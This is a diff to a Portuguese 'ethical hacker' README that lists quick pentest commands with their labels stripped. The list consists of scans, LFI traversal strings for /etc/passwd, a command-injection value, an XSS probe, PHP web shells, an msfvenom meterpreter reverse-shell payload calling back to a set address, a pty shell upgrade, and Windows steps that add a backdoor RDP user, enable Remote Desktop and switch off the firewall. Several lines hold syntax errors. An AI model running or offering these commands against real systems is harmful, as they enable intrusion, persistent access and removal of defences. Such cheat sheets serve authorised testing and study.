@@ -4,37 +4,54 @@ Encontre aqui notas e comandos de um HACKER ÉTICO
 
 ## COMANDOS RÁPIDOS
 
-Namp1
 	nmap -vvv  -sS --open -Pn -p- -T 5 <IP>
-Nmap2
+
+.
+
 	nmap -vvv -sV -sC -O -p -T 5 -A  --script vuln -Pn <PORTS> <IP>
-GoBuster
+	
+.
+	
 	gobuster dir -u http://HOST/ -w /usr/share/dirb/wordlists/big.txt -t 100 -e --no-error -r -o gobuster -a Mozilla/5.0 -x php,bkp,old,txt,xml,cgi,pdf,html,htm,asp,aspx,pl,sql
-LFI
+
+.
+
 	/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd
-LFI2
+.
+
 	/../../../../../../../../../../etc/passwd
-Comand Injection
+.
+
 	;dir;#
-XSS
+.
+
 	<script>alert('Pentester')</script>
-PHP Shell
+.
+
 	<?php system($_GET['hacker']);?>
-PHP Shell2
+.
+
 	<?php system('id']);?>
-Payload
+.
+
 	msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.16 lport:443 -f ext -o name.ext
-Shell Interative
+.
+
 	python3 -c 'import pty;pty.spawn("/bin/bash")'
-Add User Win
+.
+
 	net user suporte 12345 /add
-Add Group User Win
+.
+
 	net localgroup "Remote Desktop Users" suporte /ad
-Add Rule RDP
+.
+
 	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-Add Rule RDP2
+.
+
 	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
-Deactivate Firewall
+.
+
 	NetSh Advfirewall set allprofiles state off
 .
 .
